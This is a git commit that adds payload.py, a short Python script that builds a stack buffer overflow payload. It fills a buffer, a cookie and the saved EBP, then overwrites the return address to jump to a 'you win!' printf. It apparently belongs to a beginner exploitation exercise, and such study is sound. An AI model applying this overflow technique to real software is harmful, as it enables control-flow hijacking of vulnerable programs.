b51c463f12a1c899bc2767e127b727bfa2feda64
Miguel Camo <127974100+MigCamo@users.noreply.github.com>
2025-03-28 00:13:53 -0600

    Cargar Archivos

---
+++ payload.py
@@ -0,0 +1,13 @@
+#payload.py 
+# -- coding: utf-8 --
+from struct import pack 
+ret_addr = 0x0804849c           
+# Direccion de printf("you win!") 
+output = "A" * 10               
+#llena buf 
+output += "BBBB"                
+#llena cookie 
+output += "CCCC"                
+#llena ebp 
+output += pack("<I", ret_addr)  #establece return address 
+print(output) 
